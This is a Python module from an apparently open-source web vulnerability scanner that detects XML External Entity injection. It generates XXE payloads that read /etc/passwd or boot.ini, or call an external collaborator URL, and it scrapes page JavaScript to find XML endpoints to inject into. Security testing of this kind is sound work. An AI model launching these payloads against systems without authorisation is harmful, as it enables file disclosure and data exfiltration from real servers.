
import re
from core.scanner.module import *

class IXXEScanner:

    MODULE_INFO = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "XML eXternal Entity Injection",
        "Description": 'The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.',
        "Risk": Risk.Critical,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/611.html",
            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
        ]
    }

    def __init__(self):
        self._xxe_entity = "wrock"
        self._collaborator = self.options.get('collaborator')

    def generate_xxe_header(self, entity, payload, entity_p=""):
        return "<?xml version=\"1.0\" encoding=\"utf-8\"?>" \
            + "<!DOCTYPE foo [" \
            + "<!ELEMENT foo ANY >" \
            + "<!ENTITY %s SYSTEM \"%s\">%s" % ( entity, payload, entity_p ) \
            + "]>" 
    
    def GetCollaborator(self):
        return urljoin(self._collaborator if bool(re.match(r"^https?://", self._collaborator)) else "http://" + self._collaborator, f"{self.__class__.__name__}/{self.endpoint.GetPath()}") if self._collaborator else ""

    def GetFiles(self):
        return [ "file:///etc/passwd", "file:///C:/boot.ini", "file:///D:/boot.ini" ] + \
            (
                [ self.GetCollaborator() ] if self._collaborator else []
            )
    
    def GetPayloads(self):
        payloads = []
        xxe_body = f"<foo>&{self._xxe_entity};</foo>"

        for file in self.GetFiles():
            payloads += [ self.generate_xxe_header( self._xxe_entity, file ) + xxe_body ]

        # A creative way to detect blind cases even if we don't know exactly what tags are being taken 
        if self._collaborator:
            payloads += [ self.generate_xxe_header("% " + self._xxe_entity, self.GetCollaborator(), f"%{self._xxe_entity};") ]

        return payloads

    def is_vulnerable(self, res) -> Status:
        expected_response = [
            "Volume Serial", "root:x:0:0",
            "/root:/bin/bash", "daemon", "/usr/sbin/nologin" 
        ]

        for text in expected_response:
            if text in res.text:
                return Status.Vulnerable

        return Status.NotVulnerable


class XXEBodyBased( IXXEScanner, BodyScanner ):

    def __init__(self, config, info = IXXEScanner.MODULE_INFO) -> None:
        BodyScanner.__init__(self, config, info)
        IXXEScanner.__init__(self)

        self.StopOnSuccess()
        self.headers = None
        self.req_payload = None

    # We override BaseScanner.GetRequester, so we can manipulate headers if we need
    # Because we might need to change BaseScanner.endpoint to the endpoint that's requested by JS functions
    def GetRequester(self, endpoint=None):
        e = endpoint if endpoint else self.endpoint
        headers = self.config.GetHeaders()
        if bool( self.headers ):
            headers |= self.headers
        return e.GetRequester( headers )

    def check(self) -> bool:
        endpoint = self.GetEndPoint()

        if endpoint.GetMethodType() == "POST":
            content_type = self.GetHeaders().get( "Content-type" )
            return bool(content_type) and "xml" in content_type.lower()

        if endpoint.GetMethodType() == "GET":
            # Usually XXE vulnz are found in endpoints that are dynamically called by JS functions (Not just html forms)
            # Crawler currently cannot find endpoints requested by JS functions
            # So we have to find them ourselves by requesting all the files
            try:

                res = self.GetRequester().Send()
                if res.ok:
                    endpoint, self.headers, self.req_payload = self.find_endpoint( res.text )
                    if endpoint:
                        content_type = self.headers.get( "Content-type" )
                        if content_type and 'xml' in content_type.lower():
                            self.endpoint = endpoint
                            self.vulnInfo = self.InitVulnInfo() 
                            self.moduleInfo.SetVulnInfo( self.GetVulnInfo() )
                            return True

            except:
                pass

        return False
    
    def GetPayloads(self):
        payloads = IXXEScanner.GetPayloads( self )
        tag_pattern = "\\<[\\_\\:A-Za-z][\\_\\:A-Za-z0-9\\-\\.]*\\s*[^\\>]*\\>((?:\\<\\!\\[CDATA\\[(?:.(?<!\\]\\]>))*\\]\\]>)|(?:[^\\<\\&]*))\\<\\/[\\_\\:A-Za-z][\\_\\:A-Za-z0-9\\-\\.]*\\s*\\>"

        if self.req_payload:
            prog = re.compile( tag_pattern, re.VERBOSE )
            tag_values = [ match.group(1) for match in re.finditer(prog, self.req_payload) ]

            if tag_values:
                for file in self.GetFiles():
                    payload = self.generate_xxe_header( self._xxe_entity, file ) + self.req_payload
                    for value in tag_values:
                        payload = payload.replace( value, f"&{self._xxe_entity};" )

                    payloads += [ payload ]

        return payloads
        

    def find_endpoint(self, content) -> tuple[EndPoint, Headers, str]:
        idx = start = 0

        # Http client object for IE7+, Firefox, Chrome, Opera, Safari
        s = "XMLHttpRequest"

        while bool(~idx):
            idx = content.find( s, start )
            
            if bool(~idx):
                start = idx + len(s)
                idx2 = self.skip_whitespaces( content, idx+len(s)-1 ) + 1
                if content[idx2] == '(':
                    break

        else:
            # for IE6, IE5
            idx = content.find( "\"Microsoft.XMLHTTP\"" )
            if not bool(~idx):
                return ( None, ) * 3

            # In JavaScript, this code -> '$ var x  =
            #                              $  new     ActiveXObject  (  "Microsoft.XMLHTTP" ) ;'
            # Is valid. So, we have to pay attention to whitespaces
            idx = self.skip_whitespaces( content, idx, True ) - 1
            if idx <= 0 or content[idx] != '(':
                return ( None, ) * 3
            
            s = "ActiveXObject"
            idx = self.skip_whitespaces( content, idx, True ) - len(s)
            if idx <= 0 or content[idx : idx+len(s)] != s:
                return ( None, ) * 3
        
        # Get object name
        idx = self.skip_whitespaces( content, idx, True )
        if idx <= 3:
            return ( None, ) * 3
        
        idx -= 3 
        if content[idx : idx+3] != "new":
            return ( None, ) * 3
        
        idx = self.skip_whitespaces( content, idx, True ) - 1
        if idx <= 0 or content[idx] != '=':
            return ( None, ) * 3
        
        name_end = idx = self.skip_whitespaces( content, idx, True )
        while idx >= 0 and not self.is_whitespace(content[idx-1]):
            idx -= 1
        
        if idx <= 0: # What the f*ck!?
            return ( None, ) * 3

        obj_name = content[ idx : name_end ]

        # This variable is used to track the scope of the object
        # The same object name may be used in another scope
        # So we should only search within that object's scope.
        obj_scope = 1 

        idx = self.skip_whitespaces( content, idx-1, backward=True )

        if not ( content[idx-3:idx] in ("var", "let") or content[idx-5:idx] == "const" ): 
            # We hit the object creation, not the declaration
            # We have to find the declaration so we can search in the correct scope
            # For example:
            # var x;
            # if ( cond ) {
            #     x = new XMLHttpRequest(); // We are here, we need to move back to the declaration above
            # }
            idx2 = idx
            while True:
                while idx2 > 0 and content[idx2:idx2+len(obj_name)] != obj_name:
                    idx2 -= 1

                if idx2 > 0:
                    temp = idx2
                    idx2 = self.skip_whitespaces( content, idx2+len(obj_name)-1 ) + 1
                    if content[idx2] != '=':
                        idx2 = self.skip_whitespaces( content, idx2, True ) - len( obj_name )
                        idx2 = self.skip_whitespaces( content, idx2, True )
                        if content[idx2-3:idx2] in ("var", "let") or content[idx2-5:idx2] == "const":
                            idx = idx2
                            break

                    idx2 = temp - 1
                else:
                    break

        endpoint = None
        headers = Headers()
        payload = ""

        while bool(obj_scope) and idx < len(content):
            if content[idx] == '{':
                obj_scope += 1
            elif content[idx] == '}':
                obj_scope -= 1
            elif content[idx:].startswith(obj_name):
                idx = self.skip_whitespaces( content, idx + len(obj_name) )
                if content[idx] != '.' or idx+20 >= len(content):
                    continue
                
                method_name_idx = idx = self.skip_whitespaces( content, idx + 1 )
                while idx < len(content) and not ( self.is_whitespace(content[idx]) or content[idx] == '(' ):
                    idx += 1

                method_name = content[ method_name_idx : idx ]
                if method_name == "open":
                    endpoint = self.parse_xmlopen( content, idx )
                    if not endpoint:
                        return ( None, ) * 3

                elif method_name == "setRequestHeader":
                    hname, hvalue = self.parse_xmlsetRequestHeader( content, idx )
                    if hname and hvalue:
                        if headers.ishead(hname):
                            headers.update2( hname, hvalue )

                        else:
                            headers.add( hname, hvalue )

                elif method_name == "send":
                    payload = self.parse_xmlsend( content, idx )

            idx += 1

        if not endpoint: # LOL!
            return ( None, ) * 3
        
        return endpoint, headers, payload

    def skip_whitespaces(self, content, idx, backward=False) -> int:
        n = 2 * int( not backward ) - 1
        while 0 <= idx < len(content) and self.is_whitespace(content[idx+n]):
            idx += n
        if not ( 0 <= idx < len(content) ):
            raise IndexError("Out Of Bound")
        return idx 
    
    def is_whitespace(self, c) -> bool:
        return ord(c) <= 0x20

    def parse_xmlopen(self, content, idx) -> EndPoint:
        [ method, url ], idx = self.parse_strparams( content, idx, 2 )

        if not bool(~idx):
            return None
        
        if not ( bool(re.match(r"^https?://", url)) ):
            url = urljoin( self.GetEndPoint().GetUrl(), url )

        return EndPoint( url, method )

    def parse_xmlsetRequestHeader(self, content, idx) -> tuple[str, str]:
        [ hname, hvalue ], idx = self.parse_strparams( content, idx, 2 )

        if not bool(~idx):
            return '', ''
        
        return hname, hvalue

    def parse_xmlsend(self, content, idx) -> str:
        [ payload ], idx = self.parse_strparams( content, idx, 1 )
        return payload if bool(~idx) else ""

    def parse_str(self, content, idx) -> tuple[str, int]:
        q = content[idx]
        if q not in ( '"', '\'' ):
            return "", -1
        
        str_start = idx = idx + 1
        while idx < len(content) and content[idx] != '"':
            idx += 1

        if idx >= len(content):
            return "", -1
        
        return content[str_start : idx].replace('\\'+q, q) if idx != str_start else "", idx+1
    
    def parse_strparams(self, content, idx, n) -> tuple[list, int]:
        params = []
        retonfail = [''] * n, -1
        idx = self.skip_whitespaces( content, idx )
        if content[idx] != '(':
            return retonfail
        
        while bool( n ):
            idx = self.skip_whitespaces( content, idx+1 ) 
            p, idx = self.parse_str( content, idx )
            if not bool(~idx):
                return retonfail
            
            idx = self.skip_whitespaces( content, idx )

            if n > 1:
                if content[idx] != ',':
                    return retonfail
            
            params += [ p ]
            n -= 1

        return params, idx
        
        
class XXEParamsBased( IXXEScanner, ParamsScanner ):

    def __init__(self, config, info = IXXEScanner.MODULE_INFO) -> None:
        ParamsScanner.__init__(self, config, info)
        IXXEScanner.__init__(self)

        self.StopOnSuccess()